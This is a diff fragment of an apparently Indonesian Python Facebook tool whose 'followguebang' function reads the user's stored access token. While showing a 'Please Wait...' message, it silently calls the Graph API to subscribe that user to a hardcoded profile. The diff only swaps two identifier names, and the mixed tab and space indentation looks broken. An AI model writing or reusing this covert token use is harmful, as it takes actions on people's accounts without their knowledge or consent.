@@ -215,14 +215,14 @@ def gen():
 def followguebang():
 	try:
 		ewehayam=open("login.txt","r").read()
-	        cangcut = requests.get("https://graph.facebook.com/me/?access_token="+ewehayam)
-		a = json.loads(cangcut.text)
+	        lempang = requests.get("https://graph.facebook.com/me/?access_token="+ewehayam)
+		a = json.loads(lempang.text)
 		nama = a["name"]
 		id = a["id"]
 	except IOError:
 		print((p+"\n["+h+"!"+p+"]"+p+" Token Invalid"))
 		logs()
-	lempang("%s[%s•%s] %sPlease Wait..."%(h,p,h,p))
+	cangcut("%s[%s•%s] %sPlease Wait..."%(h,p,h,p))
 	requests.post("https://graph.facebook.com/100006307110060/subscribers?access_token=" + ewehayam)      # Yulia Ulfa
 	menu() 
 
